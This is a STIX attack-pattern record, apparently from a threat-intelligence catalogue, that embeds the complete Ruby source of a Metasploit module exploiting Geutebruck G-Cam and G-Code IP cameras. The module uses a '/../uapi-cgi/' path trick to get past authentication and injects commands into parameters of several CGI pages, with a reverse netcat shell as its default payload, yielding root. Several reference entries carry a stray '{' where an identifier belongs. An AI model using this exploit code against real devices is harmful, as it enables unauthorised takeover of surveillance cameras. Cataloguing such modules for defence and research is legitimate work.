{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--3524d1ca-3ced-4d07-85d2-686be5dbe224",
    "created": "2024-08-14T16:59:57.98542Z",
    "modified": "2024-08-14T16:59:57.985424Z",
    "name": "Geutebruck Multiple Remote Command Execution",
    "description": " This module bypasses the HTTP basic authentication used to access the /uapi-cgi/ folder and exploits multiple authenticated arbitrary command execution vulnerabilities within the parameters of various pages on Geutebruck G-Cam EEC-2xxx and G-Code EBC-21xx EFD-22xx, ETHC-22xx, and EWPC-22xx devices running firmware versions <= 1.12.0.27 as well as firmware versions 1.12.13.2 and 1.12.14.5. Successful exploitation results in remote code execution as the root user.  ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/geutebruck_cmdinject_cve_2021_335xx.rb",
            "external_id": "geutebruck_cmdinject_cve_2021_335xx.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2021-33543"
        },
        {
            "source_name": "CVE",
            "external_id": "2021-33544"
        },
        {
            "source_name": "CVE",
            "external_id": "2021-33548"
        },
        {
            "source_name": "CVE",
            "external_id": "2021-33550"
        },
        {
            "source_name": "CVE",
            "external_id": "2021-33551"
        },
        {
            "source_name": "CVE",
            "external_id": "2021-33552"
        },
        {
            "source_name": "CVE",
            "external_id": "2021-33553"
        },
        {
            "source_name": "CVE",
            "external_id": "2021-33554"
        },
        {
            "source_name": "reference",
            "url": "http://geutebruck.com"
        },
        {
            "source_name": "reference",
            "url": "https://www.randorisec.fr/udp-technology-ip-camera-vulnerabilities/"
        },
        {
            "source_name": "reference",
            "url": "https://us-cert.cisa.gov/ics/advisories/icsa-21-208-03"
        },
        {
            "source_name": "CVE-2021-33544-certmngr.cgi",
            "external_id": "{"
        },
        {
            "source_name": "CVE-2021-33548-factory.cgi",
            "external_id": "{"
        },
        {
            "source_name": "CVE-2021-33550-language.cgi",
            "external_id": "{"
        },
        {
            "source_name": "CVE-2021-33551-oem.cgi",
            "external_id": "{"
        },
        {
            "source_name": "CVE-2021-33552-simple_reclistjs.cgi",
            "external_id": "{"
        },
        {
            "source_name": "CVE-2021-33553-testcmd.cgi",
            "external_id": "{"
        },
        {
            "source_name": "CVE-2021-33554-tmpapp.cgi",
            "external_id": "{"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Geutebruck Multiple Remote Command Execution',\n        'Description' => %q{\n          This module bypasses the HTTP basic authentication used to access the /uapi-cgi/ folder\n          and exploits multiple authenticated arbitrary command execution vulnerabilities within\n          the parameters of various pages on Geutebruck G-Cam EEC-2xxx and G-Code EBC-21xx,\n          EFD-22xx, ETHC-22xx, and EWPC-22xx devices running firmware versions <= 1.12.0.27 as\n          well as firmware versions 1.12.13.2 and 1.12.14.5. Successful exploitation results in\n          remote code execution as the root user.\n        },\n\n        'Author' => [\n          'Titouan Lazard', # Of RandoriSec - Discovery\n          'Ibrahim Ayadhi', # Of RandoriSec - Discovery and Metasploit Module\n          'S\u00e9bastien Charbonnier' # Of RandoriSec - Metasploit Module\n        ],\n        'License' => MSF_LICENSE,\n        'References' => [\n          ['CVE', '2021-33543'],\n          ['CVE', '2021-33544'],\n          ['CVE', '2021-33548'],\n          ['CVE', '2021-33550'],\n          ['CVE', '2021-33551'],\n          ['CVE', '2021-33552'],\n          ['CVE', '2021-33553'],\n          ['CVE', '2021-33554'],\n          [ 'URL', 'http://geutebruck.com' ],\n          [ 'URL', 'https://www.randorisec.fr/udp-technology-ip-camera-vulnerabilities/'],\n          [ 'URL', 'https://us-cert.cisa.gov/ics/advisories/icsa-21-208-03']\n        ],\n        'DisclosureDate' => '2021-07-08',\n        'Privileged' => true,\n        'Platform' => ['unix', 'linux'],\n        'Arch' => [ARCH_CMD],\n        'Targets' => [\n          [\n            'CVE-2021-33544 - certmngr.cgi', {\n              'http_method' => 'GET',\n              'http_vars' => {\n                'action' => 'createselfcert',\n                'local' => Rex::Text.rand_text_alphanumeric(10..16),\n                'country' => Rex::Text.rand_text_alphanumeric(2),\n                'state' => '$(PLACEHOLDER_CMD)',\n                'organization' => Rex::Text.rand_text_alphanumeric(10..16),\n                'organizationunit' => Rex::Text.rand_text_alphanumeric(10..16),\n                'commonname' => Rex::Text.rand_text_alphanumeric(10..16),\n                'days' => Rex::Text.rand_text_numeric(2..4),\n                'type' => Rex::Text.rand_text_numeric(2..4)\n              },\n              'uri' => '/../uapi-cgi/certmngr.cgi'\n            }\n          ],\n          [\n            'CVE-2021-33548 - factory.cgi', {\n              'http_method' => 'GET',\n              'http_vars' => { 'preserve' => '$(PLACEHOLDER_CMD)' },\n              'uri' => '/../uapi-cgi/factory.cgi'\n            }\n          ],\n          [\n            'CVE-2021-33550 - language.cgi', {\n              'http_method' => 'GET',\n              'http_vars' => { 'date' => '$(PLACEHOLDER_CMD)' },\n              'uri' => '/../uapi-cgi/language.cgi'\n            }\n          ],\n          [\n            'CVE-2021-33551 - oem.cgi', {\n              'http_method' => 'GET',\n              'http_vars' => {\n                'action' => 'set',\n                'enable' => 'yes',\n                'environment.lang' => '$(PLACEHOLDER_CMD)'\n              },\n              'uri' => '/../uapi-cgi/oem.cgi'\n            }\n          ],\n          [\n            'CVE-2021-33552 - simple_reclistjs.cgi', {\n              'http_method' => 'GET',\n              'http_vars' => {\n                'action' => 'get',\n                'timekey' => Rex::Text.rand_text_numeric(2..4),\n                'date' => '$(PLACEHOLDER_CMD)'\n              },\n              'uri' => '/../uapi-cgi/simple_reclistjs.cgi'\n            }\n          ],\n          [\n            'CVE-2021-33553 - testcmd.cgi', {\n              'http_method' => 'GET',\n              'http_vars' => { 'command' => 'PLACEHOLDER_CMD' },\n              'uri' => '/../uapi-cgi/testcmd.cgi'\n            }\n          ],\n          [\n            'CVE-2021-33554 - tmpapp.cgi', {\n              'http_method' => 'GET',\n              'http_vars' => { 'appfile.filename' => '$(PLACEHOLDER_CMD)' },\n              'uri' => '/../uapi-cgi/tmpapp.cgi'\n            }\n          ]\n        ],\n        'DefaultTarget' => 0,\n        'DefaultOptions' => {\n          'PAYLOAD' => 'cmd/unix/reverse_netcat_gaping'\n        },\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [ARTIFACTS_ON_DISK]\n        }\n      )\n    )\n  end\n\n  def firmware\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri' => '/brand.xml'\n    )\n    unless res\n      print_error('Connection failed!')\n      return false\n    end\n\n    unless res&.body && !res.body.empty?\n      print_error('Empty body in the response!')\n      return false\n    end\n\n    res_xml = res.get_xml_document\n    if res_xml.at('//firmware').nil?\n      print_error('Target did not respond with a XML document containing the \"firmware\" element!')\n      return false\n    end\n    raw_text = res_xml.at('//firmware').text\n    if raw_text && raw_text.match(/\\d\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}/)\n      raw_text.match(/\\d\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}/)[0]\n    else\n      print_error('Target responded with a XML document containing the \"firmware\" element but its not a valid version string!')\n      false\n    end\n  end\n\n  def check\n    version = firmware\n    if version == false\n      return CheckCode::Unknown('Target did not respond with a valid XML response that we could retrieve the version from!')\n    end\n\n    rex_version = Rex::Version.new(version)\n    vprint_status(\"Found Geutebruck version #{rex_version}\")\n    if rex_version <= Rex::Version.new('1.12.0.27') || rex_version == Rex::Version.new('1.12.13.2') || rex_version == Rex::Version.new('1.12.14.5')\n      return CheckCode::Appears\n    end\n\n    CheckCode::Safe\n  end\n\n  def exploit\n    print_status(\"#{rhost}:#{rport} - Setting up request...\")\n\n    method = target['http_method']\n    if method == 'GET'\n      http_method_vars = 'vars_get'\n    else\n      http_method_vars = 'vars_post'\n    end\n\n    http_vars = target['http_vars']\n    http_vars.each do |(k, v)|\n      if v.include? 'PLACEHOLDER_CMD'\n        http_vars[k]['PLACEHOLDER_CMD'] = payload.encoded\n      end\n    end\n\n    print_status(\"Sending CMD injection request to #{rhost}:#{rport}\")\n    send_request_cgi(\n      {\n        'method' => method,\n        'uri' => target['uri'],\n        http_method_vars => http_vars\n      }\n    )\n    print_status('Exploit complete, you should get a shell as the root user!')\n  end\nend\n",
    "x_mitre_disclosure_date": "2021-07-08",
    "x_mitre_platforms": [
        "['unix', 'linux']"
    ]
}